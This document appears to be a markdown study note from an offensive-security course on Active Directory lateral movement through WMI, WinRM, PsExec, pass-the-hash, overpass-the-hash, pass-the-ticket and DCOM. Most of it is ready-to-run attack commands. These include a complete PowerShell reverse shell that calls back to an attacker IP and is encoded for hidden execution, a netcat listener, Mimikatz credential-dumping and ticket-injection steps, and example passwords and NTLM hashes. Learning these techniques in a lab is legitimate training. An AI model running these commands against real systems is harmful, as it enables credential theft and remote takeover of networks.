---
tags: wmic, winrs, mimikatz, PsExec
---
## WMI and WinRM

### WMI

Windows Management Instrumentation (WMI):
- object-oriented feature
- facilitates task automation
- communicates through port 135 (Remote Procedure Calls (RPC)) for remote access
- uses ports 19152-65535 for session data

> Prerequisites: credentials of a domain user who is also in Local Administrator group of target machine

#### Tool: wmic (deprecated)

Run a process on target ip machine: (run this command from a domain-joined machine as any account)
`wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"`
- user `jen` must satisfy the prerequisites

#### Tool: PowerShell
PowerShell script (same effect as above):
```powershell
$username = 'jen'; 
$password = 'Nexus123!'; 
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -
SessionOption $Options
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create - Arguments @{CommandLine =$Command};
```

Replace payload with reverse shell:
1. Get encoded reverse shell payload with Python: (replace the ip and port to our Kali machine's)
```python
import sys
import base64

payload = '$client = New-Object
System.Net.Sockets.TCPClient("192.168.118.2",443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " +
base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
2. Replace the value of `$command` with the encoded reverse shell payload
3. Run listener in Kali (`nc -lnvp 443`) and catch the reverse shell

### WinRM

WinRM:
- for remote host management
- the Microsoft version of the WS-Management protocol 
- exchanges XML messages over HTTP and HTTPS
- uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP
- implemented in PowerShell and numerous built-in utilities (e.g. winrs)

#### Tool: winrs

Command: (run this command from a domain-joined machine as any account)
`winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"`
- `-r`: target host
- `-u`: username of a domain user with the necessary privileges
- `-p`: password of the domain user

> Prerequisite: the domain user needs to be part of the Administrators or Remote Management Users group on the target host

For reverse shell, just replace the command with the reverse shell command from the above section

#### Tool: PowerShell remoting

1. Create a PSSession:
```powershell
$username = 'jen';
$password = 'Nexus123!';

$secureString = ConvertTo-SecureString $password -AsPlaintext - Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
2. Enter the PSSession by id:
   `Enter-PSSession 1`

## PsExec

> Prerequisites:
> - the user that authenticates to the target machine needs to be part of the Administrators local group
> - the ADMIN$ share must be available
> - File and Printer Sharing has to be turned on

PsExec executes command remotely by:
1. Write psexesvc.exe into C: directory
2. Create and spawn service on remote host
3. Runs the requested program/command as a child process of psexesvc.exe

Usage:
1. Connect to a machine on the domain as any user
2. Transfer PsExec to the machine
3. Start an interactive session on the remote target host:
   `./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd`

## Pass the Hash
authenticate to a remote system or service using a user’s NTLM hash

> Works for Active Directory domain accounts and the built-in local administrator account, but not for any other local admin account (2024 security update)

> This will not work for Kerberos authentication but only for servers or services using NTLM authentication

Tools:
- PsExec from Metasploit
- Passing-the-hash toolkit
- Impacket

Mechanics:
- the attacker connects to the victim using the Server Message Block (SMB) protocol and performs authentication using the NTLM hash

Background:
- PtH can be used to start a Windows service (e.g. cmd) and communicate with it using Named Pipes
- This is done using Service Control Manager API

> Prerequisites:
> - an SMB connection through the firewall (commonly port 445)
> - Windows File and Printer Sharing feature is enabled
> - The admin share ADMIN$ is available (which normally requires Local Admin rights on the target machine)

Using wmiexec from Impacket on Kali:
`/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`
- `-hashes`: pass the local admin hash we obtained
- `Administrator@192.168.50.73`: specify the username and target IP

## Overpass the Hash
abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then use the TGT to obtain a Ticket Granting Service (TGS)

### Tool: Mimikatz, PsExec

1. Spawn Admin shell
2. Run Mimikatz
3. Dump cached NTLM password hash of target user:
   `privilege::debug`
   `sekurlsa::logonpasswords`
4. Launch Powershell in the context of that user using the obtained NTLM hash:
   `sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`
   (note that if you run `whoami` in the new Powershell instance you won't get this user's username it is normal)
5. List cached Kerberos tickets:
   `klist` (there should be none)
6. Generate a TGT of the target user:
   `net use \\files04`
7. Check cached Kerberos tickets:
   `klist`
   (experience: there is still none, but it worked anyway 🤷)
   (if the ticket's server is krbtgt, it is TGT)
8. Since we have generated Kerberos tickets and operate in the context of the target user in the PowerShell session, we may reuse the TGT to obtain code execution on the target host:
   `.\PsExec.exe \\files04 cmd`

## Pass the Ticket
Export and re-inject a TGS elsewhere on the network and use it to authenticate a specific service. 

> Prerequisites: If the service tickets belong to the current user, then no administrative privileges are required.

1. Login to a domain machine as local admin
2. Run Mimikatz
3. Enable debug privileges and export all TGT/TGS from LSASS memory to disk in the kirbi Mimikatz format:
   `privilege::debug`
   `sekurlsa::tickets /export`
4. Verify newly generated tickets:
   `dir *.kirbi`
5. Pick the ticket of target user and service and inject it into current user's session:
   `kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
6. Check that the ticket is now in current session:
   `klist`
7. Access the target service normally

## DCOM

Distributed Component Object Model (DCOM): 
- system for creating software components that interact with each other
- interaction between multiple computers over a network

The Microsoft Management Console (MMC) COM Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.

> Prerequisite: local administrator

Example: Running calc.exe
1. log in to domain machine as local admin
2. Open an elevated PS prompt. Instantiate a remote MMC 2.0 application by specifying the target IP of target machine as the second argument of the *GetTypeFromProgID* method:
   `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","19 2.168.50.73"))`
3. Execute command:   `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
	- 4 parameters: **Command**, **Directory**, **Parameters**, **WindowState**
		- Only **Command** and **Parameters** are interesting

To get a reverse shell, replace the payload in step 3 (see payload in above section):
`$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A... AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`





